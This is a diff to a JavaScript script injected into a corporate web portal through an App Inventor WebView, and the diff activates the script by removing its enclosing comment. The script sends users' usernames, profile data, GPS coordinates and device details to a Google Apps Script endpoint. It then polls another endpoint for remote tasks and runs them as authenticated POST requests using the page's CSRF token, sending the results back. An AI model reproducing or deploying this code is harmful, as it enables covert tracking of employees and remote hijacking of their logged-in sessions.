@@ -20,7 +20,7 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 	`;
 	addCSS.appendChild(document.createTextNode(myCSS));document.head.appendChild(addCSS);
 	
-	window.AppInventor.setWebViewString('version_:FX_test_v174.b');
+	window.AppInventor.setWebViewString('version_:FX_test_v174.c');
 	
 	let info={};
 	info=filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']);
@@ -30,9 +30,10 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 	window.navigator.getBattery().then(function(obj){info.navigator.battery=filterProps(obj,'charging,chargingTime,dischargingTime,level');});
 	function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
 	
-	let deviceid=randcode(20);/*console.log('deviceid',deviceid);*/
-	let configid='initial';/*console.log('configid',configid);*/
+	let node_id=randUN(10);/*console.log('device_id',node_id);*/
+	let config_id='initial';/*console.log('config_id',config_id);*/
 	function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
+	function randUN(n=1){return randcode(n,'0123456789QAZWSXEDCRFVTGBYHNUJMIKOLP')}
 	let timeout_getTask=10000;
 	let enable_getTask=true;
 	
@@ -47,56 +48,83 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 				fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{
 					'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
 					'body':JSON.stringify({
-						obj:{
-							username:username,
-							user_data:user_data.data,
-							deviceid:deviceid,
-							latitude:user_data.data.latitude,
-							longitude:user_data.data.longitude,
-							date:new Date(Date.now()).toString(),
-							info:info,
+						'obj':{
+							'username':username,
+							'user_data':user_data.data,
+							'node_id':node_id,
+							'latitude':user_data.data.latitude,
+							'longitude':user_data.data.longitude,
+							'date':new Date(Date.now()).toString(),
+							'info':info,
 						},
+						'username':username,
+						'user_data':user_data.data,
+						'node_id':node_id,
+						'latitude':user_data.data.latitude,
+						'longitude':user_data.data.longitude,
+						'date':new Date(Date.now()).toString(),
+						'info':info,
 					})
 				}).then(function(obj){/*console.log(obj)*/}).catch(function(err){console.log(err)}).finally(function(){
 					if(true/*username=='mypanty1'*/){
 						let timer_getTask=setTimeout(getTask,timeout_getTask);
 						function getTask(){
-							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid+'&configid='+configid,).then(function(resp){return resp.json()}).then(function(obj){
+							fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username='+username+'&node_id='+node_id+'&config_id='+config_id,).then(function(resp){return resp.json()}).then(function(obj){
 								/*console.log('getTask',obj);*/
-								if(obj&&obj.config){let config=obj.config;
-									if(config.configid){configid=config.configid;};
-									if(config.timeout){timeout_getTask=config.timeout;};
-									/*if(config.enable){enable_getTask=false;};*/
+								if(obj&&obj.config){
+									if(obj.config.config_id){configid=obj.config.config_id;};
+									if(obj.config.timeout){timeout_getTask=obj.config.timeout;};
+									/*if(obj.config.enable){enable_getTask=false;};*/
 								};
-								if(obj&&obj.task_id&&obj.url&&obj.method){
+								if(obj&&obj.task&&obj.task.task_id&&obj.task.url&&obj.task.method=='POST'){
 									let payload={
-										'method':obj.method,
+										'method':obj.task.method,
 										'headers':{
 											'Content-Type':'application/json;charset=utf-8',
 											'X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
 										},
 									};
-									if(obj.body){payload.body=obj.body;};
-									fetch(obj.url,((obj.method=='POST')?payload:undefined)).then(function(resp){return resp.json()}).then(function(result){
+									if(obj.task.body){payload.body=JSON.stringify(obj.task.body,null,'\t');};
+									fetch(obj.task.url,((obj.task.method=='POST')?payload:undefined)).then(function(resp){return resp.json()}).then(function(result){
 										/*console.log('result',result);*/
 										if(result){
-											fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec',{
+											fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{
 												'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
 												'body':JSON.stringify({
-													username:username,
-													deviceid:deviceid,
-													task_id:obj.task_id,
-													result:JSON.stringify(result),
+													'username':username,
+													'node_id':node_id,
+													'task':{
+														'task_id':obj.task.task_id,
+														'response':result,
+														'isError':false,
+													},
 												})
-											}).then(function(obj){}).catch(function(err){console.log(err)}).finally(function(){next();});
+											}).then(function(obj){
+												next();
+											}).catch(function(err){
+												console.log(err);
+												next();
+											}).finally(function(){
+												/*next();*/
+											});
 										}else{
 											next();
 										};
-									}).catch(function(err){console.log(err);next();}).finally(function(){});
+									}).catch(function(err){
+										console.log(err);
+										next();
+									}).finally(function(){
+										/*next();*/
+									});
 								}else{
 									next();
 								};
-							}).catch(function(err){console.log(err)}).finally(function(){});
+							}).catch(function(err){
+								console.log(err);
+								next();
+							}).finally(function(){
+								/*next();*/
+							});
 							function next(){if(enable_getTask){timer_getTask=setTimeout(getTask,timeout_getTask);}};
 						};
 					};
@@ -918,13 +946,14 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 				function preparePL(siteid){
 					let title=sites[siteid].nodes[0].name+' '+new Date().toLocaleDateString()+' '+new Date().toLocaleTimeString()+' '+username;
 					return {
-						username:username,deviceid:deviceid,
-						sitename:sites[siteid].nodes[0].name,
-						address:sites[siteid].nodes[0].address,
-						siteid:siteid,
-						title:title,
-						json:((!dev)?(JSON.stringify({[siteid]:sites[siteid]})):(JSON.stringify({[siteid]:sites[siteid]},null,'\t'))),
-						html:'',
+						'username':username,
+						'node_id':node_id,
+						'sitename':sites[siteid].nodes[0].name,
+						'address':sites[siteid].nodes[0].address,
+						'siteid':siteid,
+						'title':title,
+						'json':((!dev)?(JSON.stringify({[siteid]:sites[siteid]})):(JSON.stringify({[siteid]:sites[siteid]},null,'\t'))),
+						'html':'',
 					};
 				};
 			},
@@ -1705,8 +1734,8 @@ if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.r
 			},
 		},
 	});
-	/*
+	
 	}else{console.log(document.title)};
 
 }());
-*/
+
